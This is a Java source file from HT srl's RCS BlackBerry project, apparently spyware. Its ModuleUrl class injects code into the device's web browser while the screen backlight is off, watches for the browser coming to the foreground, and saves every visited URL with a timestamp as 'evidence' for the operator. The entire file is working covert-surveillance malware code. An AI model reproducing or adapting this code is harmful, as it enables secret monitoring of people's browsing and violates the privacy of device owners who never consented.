//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : UrlAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.util.Date;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import blackberry.AppListener;
import blackberry.Device;
import blackberry.config.ConfModule;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.injection.AppInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.manager.ModuleManager;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class UrlAgent.
 */
public final class ModuleUrl extends BaseModule implements ApplicationObserver,
        BacklightObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModUrl", DebugLevel.VERBOSE);
    //#endif

    String appName = "Browser";

    AppInjector appInjector;

    private boolean seen = true;
    private boolean unsupported = false;
    //Timer applicationTimer;
    private static final long APP_TIMER_PERIOD = 5000;

    public static String getStaticType() {
        return "url";
    }

    public static ModuleUrl getInstance() {
        return (ModuleUrl) ModuleManager.getInstance().get(getStaticType());
    }

    protected boolean parse(ConfModule conf) {
        if (Device.getInstance().atLeast(6, 0)) {
            seen = false;
        }
        
        if (Device.getInstance().atLeast(7, 0)) {
            unsupported = true;
        }
        
        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);
        return true;
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        if (unsupported) {
            return;
        }

        AppListener.getInstance().addApplicationObserver(this);
        AppListener.getInstance().addBacklightObserver(this);

        try {
            appInjector = new AppInjector(AppInjector.APP_BROWSER);

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("actualStart: " + ex);
            //#endif
        }

        if (!Backlight.isEnabled() && !appInjector.isInfected() && seen) {
            //#ifdef DEBUG
            debug.info("injecting");
            //#endif

            appInjector.infect();
            if (Device.getInstance().atLeast(6, 0)) {
                seen = false;
            }
        }
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        AppListener.getInstance().removeApplicationObserver(this);
        AppListener.getInstance().removeBacklightObserver(this);
    }

    boolean infecting = false;

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualGo() {
        if (unsupported) {
            return;
        }

        if (appInjector.isInfected() && Backlight.isEnabled()
                && isAppForeground) {
            //#ifdef DEBUG
            debug.info("actualRun, infected, enabled, foreground");
            //#endif

            appInjector.callMenuInContext();
        } else {
            //#ifdef DEBUG
            debug.trace("actualRun: infected=" + appInjector.isInfected()
                    + " backlight=" + Backlight.isEnabled() + " foreground="
                    + isAppForeground);
            //#endif
        }
    }

    boolean isAppForeground;

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {
        if (startedName != null && startedName.indexOf(appName) >= 0) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: foreground");
            //#endif
            isAppForeground = true;
            seen = true;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: not foreground");
            //#endif
            isAppForeground = false;
        }
    }

    public void onBacklightChange(boolean on) {
        if (!on && !appInjector.isInfected() && seen) {
            //#ifdef DEBUG
            debug.info("onBacklightChange, injecting");
            //#endif

            appInjector.infect();

            if (Device.getInstance().atLeast(6, 0)) {
                seen = false;
            }
        }
    }

    public synchronized void saveUrl(String url) {
        //#ifdef DEBUG
        debug.trace("saveUrl: " + url);
        //#endif

        final Date date = new Date();
        DateTime datetime = new DateTime(date);

        int version = 0x20100713;
        final Vector items = new Vector();

        items.addElement(datetime.getStructTm());
        items.addElement(Utils.intToByteArray(version));
        items.addElement(WChar.getBytes(url, true));
        items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));

        Evidence evidence = new Evidence(EvidenceType.URL);
        evidence.createEvidence(null);
        evidence.writeEvidences(items);
        evidence.close();

    }

    //#ifdef DEBUG
    public void disinfect() {
        if (appInjector != null) {
            appInjector.disinfect();
        }
    }
    //#endif
}
